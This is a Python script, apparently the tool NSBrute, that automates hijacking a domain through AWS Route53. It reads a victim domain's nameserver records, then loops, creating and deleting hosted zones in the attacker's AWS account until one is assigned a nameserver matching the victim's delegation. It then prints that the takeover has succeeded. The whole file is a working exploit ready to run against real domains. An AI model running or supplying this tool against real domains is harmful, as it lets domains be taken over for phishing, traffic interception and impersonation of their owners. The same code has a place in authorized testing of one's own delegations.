import route53
import sys
import time
import traceback
import dns.resolver

accessKey=""
secretKey=""
victimDomain=""
targetNS=[]
nsRecord=0
successful_zone_id = ""
forceDelete=False


def force_delete_zones(successful_zone_id=""):
	# we know we have to be very careful here, there was a successful exploit of the vulnerability, and we don't want to reverse that
	for zone in conn.list_hosted_zones():
		if zone["comment"] == "created by NSBrute during testing.":
			if zone["id"] != successful_zone_id:
				zone_to_delete = conn.get_hosted_zone_by_id(zone["id"])
				zone_to_delete.delete()


class bcolors:
    TITLE = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    INFO = '\033[93m'
    OKRED = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    BGRED = '\033[41m'
    UNDERLINE = '\033[4m'
    FGWHITE = '\033[37m'
    FAIL = '\033[95m'


def myPrint(text, type):
	if(type=="INFO"):
		print bcolors.INFO+text+bcolors.ENDC+"\n"
		return
	if(type=="INFO_WS"):
		print bcolors.INFO+text+bcolors.ENDC
		return
	if(type=="ERROR"):
		print bcolors.BGRED+bcolors.FGWHITE+bcolors.BOLD+text+bcolors.ENDC
		return
	if(type=="MESSAGE"):
		print bcolors.TITLE+bcolors.BOLD+text+bcolors.ENDC+"\n"
		return
	if(type=="INSECURE_WS"):
		print bcolors.OKRED+bcolors.BOLD+text+bcolors.ENDC
		return
	if(type=="OUTPUT"):
		print bcolors.OKBLUE+bcolors.BOLD+text+bcolors.ENDC+"\n"
		return
	if(type=="OUTPUT_WS"):
		print bcolors.OKBLUE+bcolors.BOLD+text+bcolors.ENDC
		return
	if(type=="SECURE"):
		print bcolors.OKGREEN+bcolors.BOLD+text+bcolors.ENDC

#python NSTakeover.py -d domain -a accessKey -s secretKey -ns a,b,c,d


if (len(sys.argv)<7):
	myPrint("Please provide the required arguments to initiate scanning.", "ERROR")
	print ""
	myPrint("Usage: python NSBrute.py -d domain -a accessKey -s secretKey","ERROR")
	myPrint("Please try again!!", "ERROR") 
	print ""
	exit(1);
if (sys.argv[1]=="-d" or sys.argv[1]=="--domain"):
	victimDomain=sys.argv[2]
if (sys.argv[3]=="-a" or sys.argv[3]=="--accessId"):
	accessKey=sys.argv[4]
if (sys.argv[5]=="-s" or sys.argv[5]=="--secretKey"):
	secretKey=sys.argv[6]
if (len(sys.argv) == 8):
	if (sys.argv[7]=="-f" or sys.argv[7]=="--forceDelete"):
		forceDelete = True
try:
	nsRecords = dns.resolver.query(victimDomain, 'NS')
except:
	myPrint("Unable to fetch NS records for "+victimDomain+"\nPlease check the domain name and try again.","ERROR")
	exit(1)
isInt= isinstance(nsRecords,int)
if isInt and nsRecords==0:
	myPrint("No NS records found for "+victimDomain+"\nPlease check the domain name and try again.","ERROR")
	exit(1)
for nameserver in nsRecords:
		targetNS.append(str(nameserver))

#strip leading and trailing spaces	
for index in range(len(targetNS)):
		targetNS[index]=targetNS[index].strip()
#strip trailing .
		targetNS[index]=targetNS[index].strip(".")

conn = route53.connect(
    aws_access_key_id=accessKey,
    aws_secret_access_key=secretKey,
)
#While modifying the script if something goes wrong and you accidently end up creating shit loads of Zones you might need this logic for automated deletion of zones
# i=0
# listOfZoneIDs=[""]
# for zoneId in listOfZoneIDs:
# 	zone=conn.get_hosted_zone_by_id(zoneId)
# 	zone.delete()
# 	print i
# 	i=i+1

counter=0
while True:
	counter=counter+1
	myPrint("Iteration Count: "+str(counter),"INFO_WS")
	try: 
		new_zone=0
		new_zone, change_info = conn.create_hosted_zone(
	    victimDomain, comment='created by NSBrute during testing.'
		)
		#Erroneous Condition
		if new_zone is None:
			continue
		nsAWS=new_zone.nameservers
		myPrint("Created a new zone with following NS: ","INFO_WS")
		myPrint("".join(nsAWS),"INFO_WS")
		intersection=set(nsAWS).intersection(set(targetNS))
		if(len(intersection)==0):
			myPrint("No common NS found, deleting new zone","ERROR")
			print ""
			new_zone.delete()
		else:
			successful_zone_id = new_zone.id
			myPrint("Successful attempt after "+str(counter)+" iterations.","SECURE")
			myPrint("Check your AWS account, the work is done!","SECURE")
			print ""
			break
	except Exception as e:
		myPrint("Exceptional behaviour observed while creating the zone.", "ERROR")
		myPrint("Trying Again!","ERROR")
		if new_zone != 0:
			new_zone.delete()
		continue

if forceDelete:
	force_delete_zones(successful_zone_id)